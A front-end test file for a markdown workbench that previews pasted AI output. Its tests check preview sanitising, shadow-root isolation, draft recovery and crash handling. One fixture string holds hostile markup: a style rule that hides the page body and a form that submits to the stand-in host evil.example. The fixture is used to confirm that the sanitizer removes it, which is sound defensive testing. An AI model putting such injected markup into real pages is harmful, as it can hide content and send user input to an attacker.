import { render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { Workbench } from "../../components/workbench";
import { createFakeApi } from "../fake-api";

const failure = vi.hoisted(() => ({ renderPreview: false }));

vi.mock("../../lib/preview", async (importOriginal) => {
  const real = await importOriginal<typeof import("../../lib/preview")>();
  return {
    ...real,
    renderPreview: (markdown: string) => {
      if (failure.renderPreview) throw new Error("boom");
      return real.renderPreview(markdown);
    },
  };
});

vi.mock("mermaid", () => ({
  default: { initialize: vi.fn(), render: vi.fn(async (id: string) => ({ svg: `<svg id="${id}" viewBox="0 0 10 10"></svg>` })) },
}));

const DRAFT = "workbench.draft.v1";
const BOOT = "workbench.boot.v1";
const HOSTILE = '# Hostile\n\n<style>body{display:none !important}</style>\n\n<form action="https://evil.example"><input name=x><button>Go</button></form>\n\nstill here';

beforeEach(() => {
  vi.stubGlobal("fetch", createFakeApi().fetch);
  URL.createObjectURL = vi.fn(() => "blob:fake");
  URL.revokeObjectURL = vi.fn();
});

const editor = () => screen.getByPlaceholderText(/paste ai output/i) as HTMLTextAreaElement;
const host = () => screen.getByTestId("preview-host");
const shadow = () => host().shadowRoot as ShadowRoot;

describe("hostile content", () => {
  it("is neutralised in the preview, which is isolated in a shadow root", async () => {
    localStorage.setItem(DRAFT, HOSTILE);
    render(<Workbench />);

    await waitFor(() => expect(shadow().textContent).toContain("still here"));
    const root = shadow();
    expect(root.querySelector("form, input, button, link, meta, base")).toBeNull();
    expect(Array.from(root.querySelectorAll("style")).every((style) => !style.textContent?.includes("display:none"))).toBe(true);
    expect(document.querySelector("style")?.textContent ?? "").not.toContain("display:none");
    expect(document.body.contains(root.querySelector(".md-preview"))).toBe(false);
    expect(screen.getByTestId("sanitizer-notice")).toHaveTextContent(/<style>/);
  });

  it("contains the preview so positioned content cannot leave its box", async () => {
    render(<Workbench />);
    await waitFor(() => expect(shadow().querySelector(".md-preview")).toBeTruthy());
    expect(host().style.contain).toBe("layout paint");
  });
});

describe("recovery mode", () => {
  it("is not entered after a healthy load", async () => {
    localStorage.setItem(DRAFT, "# Fine");
    const first = render(<Workbench />);
    await waitFor(() => expect(sessionStorage.getItem(BOOT)).toBeNull());
    first.unmount();

    render(<Workbench />);
    await waitFor(() => expect(editor().value).toBe("# Fine"));
    expect(screen.queryByRole("alertdialog")).toBeNull();
  });

  it("holds back the draft after a failed load, keeps it intact and never autosaves over it", async () => {
    localStorage.setItem(DRAFT, HOSTILE);
    sessionStorage.setItem(BOOT, "previous-load");
    render(<Workbench />);

    const dialog = await screen.findByRole("alertdialog");
    expect(within(dialog).getByLabelText(/saved draft/i)).toHaveValue(HOSTILE);
    expect(editor().value).toContain("Executive Summary");
    expect(screen.getByTestId("preview-fallback")).toBeInTheDocument();
    expect(screen.queryByTestId("preview-host")).toBeNull();

    await new Promise((resolve) => setTimeout(resolve, 700));
    expect(localStorage.getItem(DRAFT)).toBe(HOSTILE);
    expect(sessionStorage.getItem(BOOT)).toBe("previous-load");
  });

  it("restores the draft with the preview still paused until asked", async () => {
    localStorage.setItem(DRAFT, HOSTILE);
    sessionStorage.setItem(BOOT, "previous-load");
    render(<Workbench />);

    await userEvent.click(await screen.findByRole("button", { name: "Restore draft" }));
    expect(screen.queryByRole("alertdialog")).toBeNull();
    expect(editor().value).toBe(HOSTILE);
    expect(screen.getByTestId("preview-fallback")).toHaveTextContent("<style>body{display:none !important}</style>");
    await waitFor(() => expect(sessionStorage.getItem(BOOT)).toBeNull());

    await userEvent.click(screen.getByRole("button", { name: "Render preview" }));
    await waitFor(() => expect(shadow().textContent).toContain("still here"));
    expect(shadow().querySelector("style")?.textContent).not.toContain("display:none !important");
  });

  it("starting fresh keeps the draft as a backup", async () => {
    localStorage.setItem(DRAFT, HOSTILE);
    sessionStorage.setItem(BOOT, "previous-load");
    render(<Workbench />);

    await userEvent.click(await screen.findByRole("button", { name: "Start fresh" }));
    expect(localStorage.getItem("workbench.draft.backup.v1")).toBe(HOSTILE);
    expect(editor().value).toContain("Executive Summary");
    await waitFor(() => expect(shadow().querySelector(".md-preview")).toBeTruthy());
    expect(sessionStorage.getItem(BOOT)).toBeNull();
  });
});

describe("crash screen", () => {
  it("shows the stored draft and flags the next load for recovery when the app throws", async () => {
    vi.spyOn(console, "error").mockImplementation(() => undefined);
    localStorage.setItem(DRAFT, "# Keep me");
    failure.renderPreview = true;

    render(<Workbench />);
    const dialog = await screen.findByRole("alertdialog");
    expect(dialog).toHaveTextContent("boom");
    expect(within(dialog).getByLabelText(/saved draft/i)).toHaveValue("# Keep me");
    expect(sessionStorage.getItem(BOOT)).toBe("crashed");
    failure.renderPreview = false;
  });
});
